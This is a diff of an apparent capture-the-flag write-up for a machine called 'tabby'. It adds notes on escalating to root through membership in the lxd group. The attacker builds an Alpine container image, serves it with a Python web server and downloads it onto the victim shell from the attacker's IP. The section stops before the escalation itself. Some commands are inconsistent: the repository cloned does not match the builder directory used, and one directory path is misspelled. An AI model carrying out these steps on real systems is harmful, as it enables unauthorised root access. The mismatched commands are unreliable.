@@ -526,3 +526,86 @@ groups
 ash adm cdrom dip plugdev lxd
 ```
 
+Ash cannot init lxd.
+
+Ash can run `lxc` privesc. That can be exploited: https://www.hackingarticles.in/lxd-privilege-escalation/
+
+## Get LXC image onto victim machine
+
+No images in lxc list.
+
+```
+lxc list
+If this is your first time running LXD on this machine, you should also run: lxd init
+To start your first instance, try: lxc launch ubuntu:18.04
+
++------+-------+------+------+------+-----------+
+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
++------+-------+------+------+------+-----------+
+```
+
+Clone alpine builder; fix builder; build alpine.
+
+```
+# Clone
+$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+$ sudo ./build-alpine 
+
+# Realise it's broken and fix mirrors
+$ wget http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt
+$ sudo mkdir /usr/share/alphine-mirrors/
+$ cp /usr/share/alpine-mirrors/MIRRORS.txt MIRRORS.txt
+$ sudo ./build-alpine
+
+# Starts to download..
+
+Determining the latest release... v3.12
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
+Downloading alpine-mirrors-3.5.10-r0.apk
+...
+(17/19) Installing libc-utils (0.7.2-r3)
+(18/19) Installing alpine-keys (2.2-r0)
+(19/19) Installing alpine-base (3.12.0-r0)
+Executing busybox-1.31.1-r19.trigger
+OK: 8 MiB in 19 packages
+```
+
+Create python server to upload image to victim
+```shell
+kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ ls -lah
+total 3.2M
+drwxr-xr-x 3 kali kali 4.0K Sep 27 21:46 .
+drwxr-xr-x 5 kali kali 4.0K Sep 27 21:38 ..
+-rw-r--r-- 1 root root 3.1M Sep 27 21:46 alpine-v3.12-x86_64-20200927_2146.tar.gz
+-rwxr-xr-x 1 kali kali 7.4K Sep 27 21:46 build-alpine
+drwxr-xr-x 8 kali kali 4.0K Sep 27 21:38 .git
+-rw-r--r-- 1 kali kali  26K Sep 27 21:38 LICENSE
+-rw-r--r-- 1 kali kali 1.8K Sep 26 23:00 MIRRORS.txt
+-rw-r--r-- 1 kali kali  768 Sep 27 21:38 README.md
+kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ python3 -m http.server
+```
+
+Download lxd image with victim shell.
+```
+ash@tabby:~$ mkdir alpine
+mkdir alpine
+ash@tabby:~$ cd alpine
+cd alpine
+ash@tabby:~/alpine$ wget http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
+<14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
+--2020-09-27 21:11:04--  http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
+Connecting to 10.10.14.36:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3207041 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’
+
+alpine-v3.12-x86_64 100%[===================>]   3.06M   731KB/s    in 4.3s    
+
+2020-09-27 21:11:09 (731 KB/s) - ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’ saved [3207041/3207041]
+```
+
+## LXD privesc after downloading image
+
+
+
+
